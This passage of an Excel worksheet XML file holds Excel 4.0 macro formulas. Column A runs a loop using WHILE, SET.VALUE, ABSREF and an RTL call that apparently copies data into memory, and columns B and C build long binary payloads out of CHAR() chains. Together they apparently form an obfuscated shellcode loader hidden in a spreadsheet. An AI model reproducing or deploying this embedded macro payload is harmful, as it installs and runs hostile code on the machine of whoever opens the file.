 Z_x0018__x0011_ýô_x0002_&amp;UDŒ_x0002__x001D_r`ÂH*­îy›_x0007_ý4ðŽ’¢O¦\9ÈùéÂi_x0008_&gt;£|½É*Žë¶_x001E_Àzæ×0r=_x0001_¹™zg)yQ¿‘º_x001B_'Âá|ÃÃ‰¹àÎ8é¤œ_x0011_“º€É_x0012_fÀã_x0017_\dhƒ²®7	
lÆ_x0004_Õ£áA¢Ô‡Àx\</v>
      </c>
      <c r="C31" t="str">
        <f>CHAR(240)&amp;CHAR(127)&amp;CHAR(69)&amp;CHAR(95)&amp;CHAR(160)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(240)&amp;CHAR(119)</f>
        <v>ðE_ ê‘[ðw</v>
      </c>
    </row>
    <row r="32" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A32" t="b">
        <f>WHILE(main&lt;&gt;"EXCEL")</f>
        <v>0</v>
      </c>
      <c r="B32" t="str">
        <f>CHAR(34)&amp;CHAR(25)&amp;CHAR(75)&amp;CHAR(199)&amp;CHAR(200)&amp;CHAR(41)&amp;CHAR(131)&amp;CHAR(234)&amp;CHAR(198)&amp;CHAR(179)&amp;CHAR(125)&amp;CHAR(208)&amp;CHAR(82)&amp;CHAR(59)&amp;CHAR(136)&amp;CHAR(114)&amp;CHAR(80)&amp;CHAR(11)&amp;CHAR(28)&amp;CHAR(101)&amp;CHAR(84)&amp;CHAR(15)&amp;CHAR(132)&amp;CHAR(95)&amp;CHAR(140)&amp;CHAR(78)&amp;CHAR(101)&amp;CHAR(76)&amp;CHAR(193)&amp;CHAR(44)&amp;CHAR(145)&amp;CHAR(3)&amp;CHAR(98)&amp;CHAR(53)&amp;CHAR(226)&amp;CHAR(53)&amp;CHAR(47)&amp;CHAR(204)&amp;CHAR(2)&amp;CHAR(37)&amp;CHAR(61)&amp;CHAR(189)&amp;CHAR(162)&amp;CHAR(104)&amp;CHAR(3)&amp;CHAR(115)&amp;CHAR(150)&amp;CHAR(64)&amp;CHAR(226)&amp;CHAR(41)&amp;CHAR(255)&amp;CHAR(218)&amp;CHAR(118)&amp;CHAR(127)&amp;CHAR(150)&amp;CHAR(137)&amp;CHAR(160)&amp;CHAR(6)&amp;CHAR(34)&amp;CHAR(205)&amp;CHAR(20)&amp;CHAR(199)&amp;CHAR(102)&amp;CHAR(39)&amp;CHAR(136)&amp;CHAR(181)&amp;CHAR(176)&amp;CHAR(24)&amp;CHAR(227)&amp;CHAR(172)&amp;CHAR(196)&amp;CHAR(13)&amp;CHAR(32)&amp;CHAR(250)&amp;CHAR(34)&amp;CHAR(232)&amp;CHAR(69)&amp;CHAR(88)&amp;CHAR(22)&amp;CHAR(229)&amp;CHAR(68)&amp;CHAR(64)&amp;CHAR(191)&amp;CHAR(192)&amp;CHAR(49)&amp;CHAR(34)&amp;CHAR(123)&amp;CHAR(39)&amp;CHAR(231)&amp;CHAR(249)&amp;CHAR(72)&amp;CHAR(89)&amp;CHAR(113)&amp;CHAR(199)&amp;CHAR(36)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(91)&amp;CHAR(115)&amp;CHAR(26)&amp;CHAR(191)&amp;CHAR(64)&amp;CHAR(7)&amp;CHAR(53)&amp;CHAR(182)&amp;CHAR(105)&amp;CHAR(180)&amp;CHAR(129)&amp;CHAR(13)&amp;CHAR(177)&amp;CHAR(141)&amp;CHAR(231)&amp;CHAR(229)&amp;CHAR(140)&amp;CHAR(119)&amp;CHAR(32)&amp;CHAR(177)&amp;CHAR(237)&amp;CHAR(175)&amp;CHAR(132)&amp;CHAR(41)&amp;CHAR(124)&amp;CHAR(27)&amp;CHAR(107)&amp;CHAR(161)&amp;CHAR(105)&amp;CHAR(5)&amp;CHAR(87)&amp;CHAR(231)&amp;CHAR(6)&amp;CHAR(24)&amp;CHAR(151)&amp;CHAR(37)&amp;CHAR(210)&amp;CHAR(209)&amp;CHAR(208)&amp;CHAR(25)&amp;CHAR(230)&amp;CHAR(79)&amp;CHAR(177)&amp;CHAR(33)&amp;CHAR(219)&amp;CHAR(96)&amp;CHAR(75)&amp;CHAR(141)&amp;CHAR(37)&amp;CHAR(222)&amp;CHAR(48)&amp;CHAR(121)&amp;CHAR(28)&amp;CHAR(156)&amp;CHAR(46)&amp;CHAR(254)&amp;CHAR(149)&amp;CHAR(4)&amp;CHAR(86)&amp;CHAR(87)&amp;CHAR(35)&amp;CHAR(28)&amp;CHAR(64)&amp;CHAR(51)&amp;CHAR(202)&amp;CHAR(221)&amp;CHAR(86)&amp;CHAR(40)&amp;CHAR(78)&amp;CHAR(15)&amp;CHAR(29)&amp;CHAR(168)&amp;CHAR(223)&amp;CHAR(162)&amp;CHAR(115)&amp;CHAR(220)&amp;CHAR(92)&amp;CHAR(81)&amp;CHAR(66)&amp;CHAR(41)&amp;CHAR(89)&amp;CHAR(121)&amp;CHAR(179)&amp;CHAR(241)&amp;CHAR(71)&amp;CHAR(226)&amp;CHAR(64)&amp;CHAR(184)&amp;CHAR(58)&amp;CHAR(63)&amp;CHAR(79)&amp;CHAR(144)&amp;CHAR(149)&amp;CHAR(7)&amp;CHAR(97)&amp;CHAR(33)&amp;CHAR(104)&amp;CHAR(194)&amp;CHAR(16)&amp;CHAR(46)&amp;CHAR(128)&amp;CHAR(46)&amp;CHAR(172)&amp;CHAR(89)&amp;CHAR(144)&amp;CHAR(37)&amp;CHAR(210)&amp;CHAR(120)&amp;CHAR(118)&amp;CHAR(102)&amp;CHAR(204)&amp;CHAR(43)&amp;CHAR(123)&amp;CHAR(193)&amp;CHAR(202)&amp;CHAR(81)&amp;CHAR(6)&amp;CHAR(230)&amp;CHAR(252)&amp;CHAR(54)&amp;CHAR(212)&amp;CHAR(243)&amp;CHAR(44)&amp;CHAR(49)&amp;CHAR(5)&amp;CHAR(130)&amp;CHAR(245)&amp;CHAR(117)&amp;CHAR(170)&amp;CHAR(222)&amp;CHAR(14)&amp;CHAR(207)&amp;CHAR(44)&amp;CHAR(235)&amp;CHAR(7)&amp;CHAR(219)&amp;CHAR(125)&amp;CHAR(26)&amp;CHAR(64)&amp;CHAR(177)&amp;CHAR(192)&amp;CHAR(84)&amp;CHAR(173)&amp;CHAR(47)&amp;CHAR(159)&amp;CHAR(4)&amp;CHAR(176)&amp;CHAR(190)&amp;CHAR(232)&amp;CHAR(220)&amp;CHAR(67)&amp;CHAR(96)&amp;CHAR(187)&amp;CHAR(127)&amp;CHAR(83)&amp;CHAR(158)&amp;CHAR(132)&amp;CHAR(99)</f>
        <v>"_x0019_KÇÈ)ƒêÆ³}ÐR;ˆrP_x000B__x001C_eT_x000F_„_ŒNeLÁ,‘_x0003_b5â5/Ì_x0002_%=½¢h_x0003_s–@â)ÿÚv–‰ _x0006_"Í_x0014_Çf'ˆµ°_x0018_ã¬Ä_x000D_ ú"èEX_x0016_åD@¿À1"{'çùHYqÇ$_x0002_„[s_x001A_¿@_x0007_5¶i´_x000D_±çåŒw ±í¯„)|_x001B_k¡i_x0005_Wç_x0006__x0018_—%ÒÑÐ_x0019_æO±!Û`K%Þ0y_x001C_œ.þ•_x0004_VW#_x001C_@3ÊÝV(N_x000F__x001D_¨ß¢sÜ\QB)Yy³ñGâ@¸:?O•_x0007_a!hÂ_x0010_.€.¬Y%ÒxvfÌ+{ÁÊQ_x0006_æü6Ôó,1_x0005_‚õuªÞ_x000E_Ï,ë_x0007_Û}_x001A_@±ÀT­/Ÿ_x0004_°¾èÜC`»Sž„c</v>
      </c>
      <c r="C32" t="str">
        <f>CHAR(183)&amp;CHAR(66)&amp;CHAR(193)&amp;CHAR(99)&amp;CHAR(97)&amp;CHAR(19)&amp;CHAR(53)&amp;CHAR(225)&amp;CHAR(4)&amp;CHAR(124)</f>
        <v>·BÁca_x0013_5á_x0004_|</v>
      </c>
    </row>
    <row r="33" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A33" t="b">
        <f>SET.VALUE(D2,LEN(main))</f>
        <v>0</v>
      </c>
      <c r="B33" t="str">
        <f>CHAR(29)&amp;CHAR(235)&amp;CHAR(38)&amp;CHAR(125)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(222)&amp;CHAR(14)&amp;CHAR(144)&amp;CHAR(20)&amp;CHAR(228)&amp;CHAR(45)&amp;CHAR(43)&amp;CHAR(130)&amp;CHAR(32)&amp;CHAR(122)&amp;CHAR(120)&amp;CHAR(117)&amp;CHAR(25)&amp;CHAR(246)&amp;CHAR(61)&amp;CHAR(254)&amp;CHAR(22)&amp;CHAR(184)&amp;CHAR(11)&amp;CHAR(83)&amp;CHAR(125)&amp;CHAR(71)&amp;CHAR(24)&amp;CHAR(238)&amp;CHAR(122)&amp;CHAR(75)&amp;CHAR(216)&amp;CHAR(180)&amp;CHAR(1)&amp;CHAR(103)&amp;CHAR(241)&amp;CHAR(207)&amp;CHAR(68)&amp;CHAR(246)&amp;CHAR(175)&amp;CHAR(162)&amp;CHAR(193)&amp;CHAR(158)&amp;CHAR(118)&amp;CHAR(145)&amp;CHAR(183)&amp;CHAR(168)&amp;CHAR(170)&amp;CHAR(113)&amp;CHAR(132)&amp;CHAR(196)&amp;CHAR(40)&amp;CHAR(26)&amp;CHAR(82)&amp;CHAR(111)&amp;CHAR(104)&amp;CHAR(103)&amp;CHAR(217)&amp;CHAR(12)&amp;CHAR(6)&amp;CHAR(210)&amp;CHAR(191)&amp;CHAR(246)&amp;CHAR(211)&amp;CHAR(134)&amp;CHAR(20)&amp;CHAR(193)&amp;CHAR(130)&amp;CHAR(37)&amp;CHAR(26)&amp;CHAR(90)&amp;CHAR(56)&amp;CHAR(57)&amp;CHAR(153)&amp;CHAR(41)&amp;CHAR(43)&amp;CHAR(167)&amp;CHAR(37)&amp;CHAR(163)&amp;CHAR(53)&amp;CHAR(9)&amp;CHAR(84)&amp;CHAR(244)&amp;CHAR(254)&amp;CHAR(144)&amp;CHAR(161)&amp;CHAR(77)&amp;CHAR(48)&amp;CHAR(186)&amp;CHAR(159)&amp;CHAR(161)&amp;CHAR(232)&amp;CHAR(193)&amp;CHAR(61)&amp;CHAR(84)&amp;CHAR(97)&amp;CHAR(78)&amp;CHAR(137)&amp;CHAR(219)&amp;CHAR(173)&amp;CHAR(180)&amp;CHAR(95)&amp;CHAR(244)&amp;CHAR(130)&amp;CHAR(81)&amp;CHAR(230)&amp;CHAR(52)&amp;CHAR(252)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(76)&amp;CHAR(36)&amp;CHAR(148)&amp;CHAR(177)&amp;CHAR(242)&amp;CHAR(104)&amp;CHAR(111)&amp;CHAR(146)&amp;CHAR(228)&amp;CHAR(74)&amp;CHAR(148)&amp;CHAR(238)&amp;CHAR(79)&amp;CHAR(36)&amp;CHAR(208)&amp;CHAR(244)&amp;CHAR(34)&amp;CHAR(131)&amp;CHAR(96)&amp;CHAR(71)&amp;CHAR(167)&amp;CHAR(156)&amp;CHAR(246)&amp;CHAR(51)&amp;CHAR(218)&amp;CHAR(78)&amp;CHAR(31)&amp;CHAR(178)&amp;CHAR(49)&amp;CHAR(112)&amp;CHAR(31)&amp;CHAR(247)&amp;CHAR(45)&amp;CHAR(189)&amp;CHAR(39)&amp;CHAR(72)&amp;CHAR(175)&amp;CHAR(157)&amp;CHAR(224)&amp;CHAR(22)&amp;CHAR(85)&amp;CHAR(72)&amp;CHAR(152)&amp;CHAR(229)&amp;CHAR(65)&amp;CHAR(164)&amp;CHAR(51)&amp;CHAR(23)&amp;CHAR(73)&amp;CHAR(68)&amp;CHAR(66)&amp;CHAR(97)&amp;CHAR(161)&amp;CHAR(170)&amp;CHAR(231)&amp;CHAR(158)&amp;CHAR(123)&amp;CHAR(163)&amp;CHAR(100)&amp;CHAR(208)&amp;CHAR(111)&amp;CHAR(224)&amp;CHAR(91)&amp;CHAR(225)&amp;CHAR(230)&amp;CHAR(209)&amp;CHAR(211)&amp;CHAR(9)&amp;CHAR(183)&amp;CHAR(121)&amp;CHAR(217)&amp;CHAR(35)&amp;CHAR(233)&amp;CHAR(140)&amp;CHAR(153)&amp;CHAR(11)&amp;CHAR(213)&amp;CHAR(55)&amp;CHAR(182)&amp;CHAR(171)&amp;CHAR(212)&amp;CHAR(228)&amp;CHAR(82)&amp;CHAR(44)&amp;CHAR(116)&amp;CHAR(145)&amp;CHAR(201)&amp;CHAR(47)&amp;CHAR(88)&amp;CHAR(114)&amp;CHAR(217)&amp;CHAR(177)&amp;CHAR(121)&amp;CHAR(226)&amp;CHAR(51)&amp;CHAR(16)&amp;CHAR(159)&amp;CHAR(225)&amp;CHAR(43)&amp;CHAR(101)&amp;CHAR(6)&amp;CHAR(194)&amp;CHAR(27)&amp;CHAR(224)&amp;CHAR(2)&amp;CHAR(239)&amp;CHAR(13)&amp;CHAR(244)&amp;CHAR(205)&amp;CHAR(156)&amp;CHAR(11)&amp;CHAR(234)&amp;CHAR(87)&amp;CHAR(99)&amp;CHAR(63)&amp;CHAR(108)&amp;CHAR(142)&amp;CHAR(76)&amp;CHAR(69)&amp;CHAR(215)&amp;CHAR(64)&amp;CHAR(131)&amp;CHAR(134)&amp;CHAR(27)&amp;CHAR(230)&amp;CHAR(104)&amp;CHAR(17)&amp;CHAR(202)&amp;CHAR(2)&amp;CHAR(57)&amp;CHAR(121)&amp;CHAR(230)&amp;CHAR(234)&amp;CHAR(33)&amp;CHAR(82)&amp;CHAR(184)&amp;CHAR(162)&amp;CHAR(170)&amp;CHAR(237)&amp;CHAR(154)&amp;CHAR(181)&amp;CHAR(231)&amp;CHAR(238)&amp;CHAR(58)</f>
        <v>_x001D_ë&amp;}_x0002_…Þ_x000E__x0014_ä-+‚ zxu_x0019_ö=þ_x0016_¸_x000B_S}G_x0018_îzKØ´_x0001_gñÏDö¯¢Ážv‘·¨ªq„Ä(_x001A_RohgÙ_x000C__x0006_Ò¿öÓ†_x0014_Á‚%_x001A_Z89™)+§%£5	Tôþ¡M0ºŸ¡èÁ=TaN‰Û­´_ô‚Qæ4ü
_x0006_L$”±òho’äJ”îO$Ðô"ƒ`G§œö3ÚN_x001F_²1p_x001F_÷-½'H¯à_x0016_UH˜åA¤3_x0017_IDBa¡ªçž{£dÐoà[áæÑÓ	·yÙ#éŒ™_x000B_Õ7¶«ÔäR,t‘É/XrÙ±yâ3_x0010_Ÿá+e_x0006_Â_x001B_à_x0002_ï_x000D_ôÍœ_x000B_êWc?lŽLE×@ƒ†_x001B_æh_x0011_Ê_x0002_9yæê!R¸¢ªíšµçî:</v>
      </c>
      <c r="C33" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(217)&amp;CHAR(214)&amp;CHAR(181)&amp;CHAR(207)&amp;CHAR(119)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(2)</f>
        <v>ˆêÙÖµÏwzˆ_x0002_</v>
      </c>
    </row>
    <row r="34" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A34" t="e">
        <f>RTL(A22+(D1*10),main,LEN(main))</f>
        <v>#NAME?</v>
      </c>
      <c r="B34" t="str">
        <f>CHAR(166)&amp;CHAR(220)&amp;CHAR(249)&amp;CHAR(25)&amp;CHAR(52)&amp;CHAR(50)&amp;CHAR(74)&amp;CHAR(129)&amp;CHAR(225)&amp;CHAR(237)&amp;CHAR(123)&amp;CHAR(161)&amp;CHAR(122)&amp;CHAR(19)&amp;CHAR(51)&amp;CHAR(37)&amp;CHAR(32)&amp;CHAR(238)&amp;CHAR(78)&amp;CHAR(252)&amp;CHAR(20)&amp;CHAR(71)&amp;CHAR(221)&amp;CHAR(201)&amp;CHAR(175)&amp;CHAR(224)&amp;CHAR(79)&amp;CHAR(91)&amp;CHAR(216)&amp;CHAR(219)&amp;CHAR(35)&amp;CHAR(123)&amp;CHAR(194)&amp;CHAR(170)&amp;CHAR(91)&amp;CHAR(231)&amp;CHAR(237)&amp;CHAR(99)&amp;CHAR(169)&amp;CHAR(66)&amp;CHAR(4)&amp;CHAR(52)&amp;CHAR(228)&amp;CHAR(126)&amp;CHAR(152)&amp;CHAR(11)&amp;CHAR(139)&amp;CHAR(100)&amp;CHAR(109)&amp;CHAR(69)&amp;CHAR(181)&amp;CHAR(138)&amp;CHAR(78)&amp;CHAR(136)&amp;CHAR(151)&amp;CHAR(35)&amp;CHAR(106)&amp;CHAR(227)&amp;CHAR(6)&amp;CHAR(50)&amp;CHAR(188)&amp;CHAR(216)&amp;CHAR(149)&amp;CHAR(194)&amp;CHAR(82)&amp;CHAR(205)&amp;CHAR(129)&amp;CHAR(67)&amp;CHAR(190)&amp;CHAR(61)&amp;CHAR(159)&amp;CHAR(226)&amp;CHAR(217)&amp;CHAR(177)&amp;CHAR(201)&amp;CHAR(252)&amp;CHAR(152)&amp;CHAR(70)&amp;CHAR(164)&amp;CHAR(203)&amp;CHAR(80)&amp;CHAR(203)&amp;CHAR(179)&amp;CHAR(29)&amp;CHAR(151)&amp;CHAR(249)&amp;CHAR(119)&amp;CHAR(211)&amp;CHAR(183)&amp;CHAR(131)&amp;CHAR(89)&amp;CHAR(117)&amp;CHAR(236)&amp;CHAR(238)&amp;CHAR(173)&amp;CHAR(55)&amp;CHAR(188)&amp;CHAR(21)&amp;CHAR(191)&amp;CHAR(142)&amp;CHAR(179)&amp;CHAR(126)&amp;CHAR(237)&amp;CHAR(42)&amp;CHAR(254)&amp;CHAR(51)&amp;CHAR(222)&amp;CHAR(134)&amp;CHAR(241)&amp;CHAR(123)&amp;CHAR(242)&amp;CHAR(57)&amp;CHAR(143)&amp;CHAR(163)&amp;CHAR(247)&amp;CHAR(136)&amp;CHAR(133)&amp;CHAR(51)&amp;CHAR(40)&amp;CHAR(174)&amp;CHAR(180)&amp;CHAR(12)&amp;CHAR(148)&amp;CHAR(202)&amp;CHAR(60)&amp;CHAR(62)&amp;CHAR(209)&amp;CHAR(240)&amp;CHAR(53)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(190)&amp;CHAR(217)&amp;CHAR(109)&amp;CHAR(132)&amp;CHAR(10)&amp;CHAR(109)&amp;CHAR(236)&amp;CHAR(36)&amp;CHAR(167)&amp;CHAR(173)&amp;CHAR(70)&amp;CHAR(111)&amp;CHAR(255)&amp;CHAR(5)&amp;CHAR(90)&amp;CHAR(215)&amp;CHAR(17)&amp;CHAR(95)&amp;CHAR(181)&amp;CHAR(196)&amp;CHAR(105)&amp;CHAR(178)&amp;CHAR(110)&amp;CHAR(66)&amp;CHAR(129)&amp;CHAR(243)&amp;CHAR(19)&amp;CHAR(60)&amp;CHAR(10)&amp;CHAR(169)&amp;CHAR(165)&amp;CHAR(86)&amp;CHAR(215)&amp;CHAR(199)&amp;CHAR(155)&amp;CHAR(28)&amp;CHAR(141)&amp;CHAR(146)&amp;CHAR(78)&amp;CHAR(208)&amp;CHAR(242)&amp;CHAR(76)&amp;CHAR(36)&amp;CHAR(201)&amp;CHAR(140)&amp;CHAR(195)&amp;CHAR(222)&amp;CHAR(131)&amp;CHAR(215)&amp;CHAR(188)&amp;CHAR(126)&amp;CHAR(71)&amp;CHAR(65)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(2)&amp;CHAR(205)&amp;CHAR(48)&amp;CHAR(108)&amp;CHAR(243)&amp;CHAR(218)&amp;CHAR(123)&amp;CHAR(175)&amp;CHAR(71)&amp;CHAR(162)&amp;CHAR(29)&amp;CHAR(146)&amp;CHAR(33)&amp;CHAR(187)&amp;CHAR(64)&amp;CHAR(83)&amp;CHAR(229)&amp;CHAR(216)&amp;CHAR(61)&amp;CHAR(54)&amp;CHAR(111)&amp;CHAR(105)&amp;CHAR(30)&amp;CHAR(27)&amp;CHAR(175)&amp;CHAR(124)&amp;CHAR(122)&amp;CHAR(135)&amp;CHAR(2)&amp;CHAR(138)&amp;CHAR(1)&amp;CHAR(252)&amp;CHAR(195)&amp;CHAR(133)&amp;CHAR(130)&amp;CHAR(164)&amp;CHAR(54)&amp;CHAR(159)&amp;CHAR(118)&amp;CHAR(56)&amp;CHAR(186)&amp;CHAR(230)&amp;CHAR(194)&amp;CHAR(75)&amp;CHAR(177)&amp;CHAR(47)&amp;CHAR(41)&amp;CHAR(135)&amp;CHAR(94)&amp;CHAR(195)&amp;CHAR(2)&amp;CHAR(95)&amp;CHAR(195)&amp;CHAR(45)&amp;CHAR(114)&amp;CHAR(101)&amp;CHAR(78)&amp;CHAR(40)&amp;CHAR(68)&amp;CHAR(248)&amp;CHAR(230)&amp;CHAR(247)&amp;CHAR(135)&amp;CHAR(18)&amp;CHAR(180)&amp;CHAR(57)&amp;CHAR(59)&amp;CHAR(38)&amp;CHAR(134)</f>
        <v>¦Üù_x0019_42Jáí{¡z_x0013_3% îNü_x0014_GÝÉ¯àO[ØÛ#{Âª[çíc©B_x0004_4ä~˜_x000B_‹dmEµŠNˆ—#jã_x0006_2¼Ø•ÂRÍC¾=ŸâÙ±Éü˜F¤ËPË³_x001D_—ùwÓ·ƒYuìî­7¼_x0015_¿Ž³~í*þ3Þ†ñ{ò9£÷ˆ…3(®´_x000C_”Ê&lt;&gt;Ñð5_x000D_„¾Ùm„
mì$§­Foÿ_x0005_Z×_x0011__µÄi²nBó_x0013_&lt;
©¥V×Ç›_x001C_’NÐòL$ÉŒÃÞƒ×¼~GAU†_x0002_Í0lóÚ{¯G¢_x001D_’!»@SåØ=6oi_x001E__x001B_¯|z‡_x0002_Š_x0001_üÃ…‚¤6Ÿv8ºæÂK±/)‡^Ã_x0002__Ã-reN(Døæ÷‡_x0012_´9;&amp;†</v>
      </c>
      <c r="C34" t="str">
        <f>CHAR(105)&amp;CHAR(88)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(20)&amp;CHAR(50)&amp;CHAR(3)&amp;CHAR(222)&amp;CHAR(180)&amp;CHAR(115)</f>
        <v>iX¸ô_x0014_2_x0003_Þ´s</v>
      </c>
    </row>
    <row r="35" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A35" t="b">
        <f>SET.VALUE(D1,D1+1)</f>
        <v>0</v>
      </c>
      <c r="B35" t="str">
        <f>CHAR(52)&amp;CHAR(192)&amp;CHAR(248)&amp;CHAR(203)&amp;CHAR(227)&amp;CHAR(205)&amp;CHAR(100)&amp;CHAR(214)&amp;CHAR(228)&amp;CHAR(166)&amp;CHAR(91)&amp;CHAR(206)&amp;CHAR(175)&amp;CHAR(128)&amp;CHAR(14)&amp;CHAR(37)&amp;CHAR(86)&amp;CHAR(140)&amp;CHAR(203)&amp;CHAR(168)&amp;CHAR(129)&amp;CHAR(56)&amp;CHAR(203)&amp;CHAR(111)&amp;CHAR(4)&amp;CHAR(185)&amp;CHAR(254)&amp;CHAR(41)&amp;CHAR(195)&amp;CHAR(22)&amp;CHAR(231)&amp;CHAR(50)&amp;CHAR(1)&amp;CHAR(215)&amp;CHAR(105)&amp;CHAR(124)&amp;CHAR(111)&amp;CHAR(122)&amp;CHAR(110)&amp;CHAR(28)&amp;CHAR(137)&amp;CHAR(84)&amp;CHAR(236)&amp;CHAR(109)&amp;CHAR(159)&amp;CHAR(2)&amp;CHAR(155)&amp;CHAR(199)&amp;CHAR(154)&amp;CHAR(175)&amp;CHAR(150)&amp;CHAR(96)&amp;CHAR(251)&amp;CHAR(210)&amp;CHAR(95)&amp;CHAR(84)&amp;CHAR(166)&amp;CHAR(1)&amp;CHAR(220)&amp;CHAR(27)&amp;CHAR(237)&amp;CHAR(204)&amp;CHAR(25)&amp;CHAR(158)&amp;CHAR(25)&amp;CHAR(179)&amp;CHAR(40)&amp;CHAR(209)&amp;CHAR(18)&amp;CHAR(198)&amp;CHAR(23)&amp;CHAR(151)&amp;CHAR(130)&amp;CHAR(90)&amp;CHAR(12)&amp;CHAR(192)&amp;CHAR(114)&amp;CHAR(72)&amp;CHAR(237)&amp;CHAR(145)&amp;CHAR(141)&amp;CHAR(49)&amp;CHAR(91)&amp;CHAR(55)&amp;CHAR(116)&amp;CHAR(144)&amp;CHAR(229)&amp;CHAR(224)&amp;CHAR(22)&amp;CHAR(25)&amp;CHAR(106)&amp;CHAR(205)&amp;CHAR(162)&amp;CHAR(24)&amp;CHAR(231)&amp;CHAR(216)&amp;CHAR(253)&amp;CHAR(94)&amp;CHAR(255)&amp;CHAR(160)&amp;CHAR(10)&amp;CHAR(203)&amp;CHAR(104)&amp;CHAR(212)&amp;CHAR(97)&amp;CHAR(68)&amp;CHAR(32)&amp;CHAR(207)&amp;CHAR(17)&amp;CHAR(40)&amp;CHAR(182)&amp;CHAR(82)&amp;CHAR(159)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(80)&amp;CHAR(30)&amp;CHAR(46)&amp;CHAR(188)&amp;CHAR(82)&amp;CHAR(245)&amp;CHAR(163)&amp;CHAR(150)&amp;CHAR(254)&amp;CHAR(39)&amp;CHAR(228)&amp;CHAR(78)&amp;CHAR(81)&amp;CHAR(235)&amp;CHAR(95)&amp;CHAR(157)&amp;CHAR(85)&amp;CHAR(13)&amp;CHAR(56)&amp;CHAR(115)&amp;CHAR(203)&amp;CHAR(46)&amp;CHAR(124)&amp;CHAR(216)&amp;CHAR(59)&amp;CHAR(198)&amp;CHAR(245)&amp;CHAR(60)&amp;CHAR(166)&amp;CHAR(58)&amp;CHAR(35)&amp;CHAR(32)&amp;CHAR(44)&amp;CHAR(253)&amp;CHAR(105)&amp;CHAR(228)&amp;CHAR(197)&amp;CHAR(2)&amp;CHAR(237)&amp;CHAR(33)&amp;CHAR(72)&amp;CHAR(228)&amp;CHAR(208)&amp;CHAR(118)&amp;CHAR(26)&amp;CHAR(33)&amp;CHAR(220)&amp;CHAR(12)&amp;CHAR(190)&amp;CHAR(174)&amp;CHAR(67)&amp;CHAR(115)&amp;CHAR(70)&amp;CHAR(64)&amp;CHAR(65)&amp;CHAR(239)&amp;CHAR(22)&amp;CHAR(147)&amp;CHAR(15)&amp;CHAR(194)&amp;CHAR(185)&amp;CHAR(45)&amp;CHAR(8)&amp;CHAR(11)&amp;CHAR(128)&amp;CHAR(167)&amp;CHAR(152)&amp;CHAR(160)&amp;CHAR(66)&amp;CHAR(59)&amp;CHAR(198)&amp;CHAR(9)&amp;CHAR(97)&amp;CHAR(163)&amp;CHAR(246)&amp;CHAR(193)&amp;CHAR(30)&amp;CHAR(243)&amp;CHAR(52)&amp;CHAR(128)&amp;CHAR(245)&amp;CHAR(219)&amp;CHAR(57)&amp;CHAR(193)&amp;CHAR(90)&amp;CHAR(231)&amp;CHAR(192)&amp;CHAR(132)&amp;CHAR(53)&amp;CHAR(11)&amp;CHAR(162)&amp;CHAR(137)&amp;CHAR(255)&amp;CHAR(221)&amp;CHAR(238)&amp;CHAR(92)&amp;CHAR(187)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(1)&amp;CHAR(223)&amp;CHAR(143)&amp;CHAR(170)&amp;CHAR(232)&amp;CHAR(38)&amp;CHAR(224)&amp;CHAR(127)&amp;CHAR(181)&amp;CHAR(35)&amp;CHAR(86)&amp;CHAR(81)&amp;CHAR(72)&amp;CHAR(213)&amp;CHAR(34)&amp;CHAR(218)&amp;CHAR(114)&amp;CHAR(104)&amp;CHAR(18)&amp;CHAR(162)&amp;CHAR(61)&amp;CHAR(201)&amp;CHAR(243)&amp;CHAR(200)&amp;CHAR(16)&amp;CHAR(89)&amp;CHAR(177)&amp;CHAR(127)&amp;CHAR(243)&amp;CHAR(61)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(142)&amp;CHAR(9)&amp;CHAR(79)&amp;CHAR(138)&amp;CHAR(129)&amp;CHAR(46)&amp;CHAR(254)&amp;CHAR(203)&amp;CHAR(26)</f>
        <v>4ÀøËãÍdÖä¦[Î¯€_x000E_%VŒË¨8Ëo_x0004_¹þ)Ã_x0016_ç2_x0001_×i|ozn_x001C_‰TìmŸ_x0002_›Çš¯–`ûÒ_T¦_x0001_Ü_x001B_íÌ_x0019_ž_x0019_³(Ñ_x0012_Æ_x0017_—‚Z_x000C_ÀrHí‘1[7tåà_x0016__x0019_jÍ¢_x0018_çØý^ÿ 
ËhÔaD Ï_x0011_(¶RŸ¤ûP_x001E_.¼Rõ£–þ'äNQë_U_x000D_8sË.|Ø;Æõ&lt;¦:# ,ýiäÅ_x0002_í!HäÐv_x001A_!Ü_x000C_¾®CsF@Aï_x0016_“_x000F_Â¹-_x0008__x000B_€§˜ B;Æ	a£öÁ_x001E_ó4€õÛ9ÁZçÀ„5_x000B_¢‰ÿÝî\»M&amp;_x0001_ßªè&amp;àµ#VQHÕ"Úrh_x0012_¢=ÉóÈ_x0010_Y±ó=!_x001D_Ž	OŠ.þË_x001A_</v>
      </c>
      <c r="C35" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(50)&amp;CHAR(11)&amp;CHAR(44)&amp;CHAR(209)&amp;CHAR(18)&amp;CHAR(49)&amp;CHAR(4)</f>
        <v>¸ôq2_x000B_,Ñ_x0012_1_x0004_</v>
      </c>
    </row>
    <row r="36" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A36" t="b">
        <f bx="1">main=ABSREF("R[1]C",main)</f>
        <v>0</v>
      </c>
      <c r="B36" t="str">
